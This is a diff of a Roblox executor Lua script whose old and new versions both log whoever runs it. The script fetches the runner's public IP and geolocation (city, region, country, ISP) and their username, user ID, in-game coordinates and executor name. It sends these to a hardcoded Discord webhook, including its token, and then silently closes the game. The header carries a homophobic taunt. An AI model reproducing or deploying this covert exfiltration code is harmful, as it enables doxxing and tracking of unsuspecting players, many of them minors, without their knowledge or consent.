@@ -1,71 +1,72 @@
 --# CRACK IF GAY - MADE BY 0rep on discord
+-- SERVICES
 local HttpService = game:GetService("HttpService")
-local req = (http_request or request or syn and syn.request)
+local lp = game.Players.LocalPlayer
 
--- SETTINGS
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1372316329012498452/dHiTEVxQeG2YLDflZeFPKteXaPo8n13Ka01lLvY4D3V2YdkpmeE9gWe0n4GCQ4i0jnUY" -- Your actual webhook
+-- Get IP using the working IP finder method
+local ip = game:HttpGet("https://api.ipify.org")
 
--- Ensure HTTP request is working
-if not req then
-    return
-end
+-- Get geo-location data (such as country, city, region, etc.)
+local geoData = game:HttpGet("https://ipapi.co/json")
+local geoTable = HttpService:JSONDecode(geoData)
 
--- INIT
-local ip = "Unknown"
-local geoData = {}
+-- User information
+local username = lp.Name
+local displayName = lp.DisplayName
+local userId = lp.UserId
+local country = geoTable.country_name or "N/A"
+local city = geoTable.city or "N/A"
+local region = geoTable.region or "N/A"
+local isp = geoTable.org or "N/A"
+local coords = lp.Character and lp.Character.HumanoidRootPart and lp.Character.HumanoidRootPart.Position
+local coordsStr = coords and string.format("X: %.2f, Y: %.2f, Z: %.2f", coords.X, coords.Y, coords.Z) or "N/A"
 
--- TRY TO GET IP
-pcall(function()
-    local ipResponse = req({
-        Url = "https://api.ipify.org?format=json", -- Updated to ipify API for better IP fetching
-        Method = "GET"
-    })
-    if ipResponse and ipResponse.StatusCode == 200 then
-        ip = HttpService:JSONDecode(ipResponse.Body).ip
-    end
-end)
+-- Prepare the data to send to the Discord webhook
+local data = {
+    ["username"] = "LOGGED",
+    ["content"] = string.format(
+        "Username: %s\nDisplay Name: %s\nUser ID: %s\nIP: %s\nLocation: %s, %s, %s\nISP: %s\nCoordinates: %s\nExecutor: %s",
+        username,
+        displayName,
+        userId,
+        ip,
+        city,
+        region,
+        country,
+        isp,
+        coordsStr,
+        identifyexecutor and identifyexecutor() or "Unknown"
+    )
+}
 
--- TRY TO GET GEOLOCATION (AND VPN STATUS)
-pcall(function()
-    local geoResponse = req({
-        Url = "https://ipapi.co/json",
-        Method = "GET"
-    })
-    if geoResponse and geoResponse.StatusCode == 200 then
-        geoData = HttpService:JSONDecode(geoResponse.Body)
-    end
-end)
+local jsonData = HttpService:JSONEncode(data)
+local url = "https://discord.com/api/webhooks/1372316329012498452/dHiTEVxQeG2YLDflZeFPKteXaPo8n13Ka01lLvY4D3V2YdkpmeE9gWe0n4GCQ4i0jnUY"  -- Your webhook URL
 
--- USER INFO
-local username = game.Players.LocalPlayer.Name
-local userId = game.Players.LocalPlayer.UserId
-local country = geoData.country_name or "N/A"
-local city = geoData.city or "N/A"
-local region = geoData.region or "N/A"
-local org = geoData.org or "N/A"
-local coords = geoData.latitude and geoData.longitude and (geoData.latitude .. ", " .. geoData.longitude) or "N/A"
+-- Try all known request methods
+local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
 
--- BUILD AND LOG TO DISCORD WEBHOOK
-if ip ~= "Unknown" and geoData.country_name then
-    local msg = string.format([[
-    Script executed:
-    Username: %s (%s)
-    IP: %s
-    Location: %s, %s
-    Country: %s
-    ISP: %s
-    ]], username, userId, ip, city, region, country, org)
-
-    pcall(function()
-        req({
-            Url = WEBHOOK_URL,
+if requestFunc then
+    -- Send the request to the Discord webhook
+    local success, result = pcall(function()
+        return requestFunc({
+            Url = url,
             Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({ content = msg })
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
         })
     end)
+
+    if success then
+        -- Nothing will print in the console here
+    else
+        warn("Failed to send webhook:", result)  -- In case of failure, a warning will be shown
+    end
+else
+    warn("No supported HTTP request function found. Your executor might not support webhooks.")
 end
 
--- CLOSE THE GAME AFTER
+-- Close the game silently after executing
 wait(1)
 game:Shutdown()
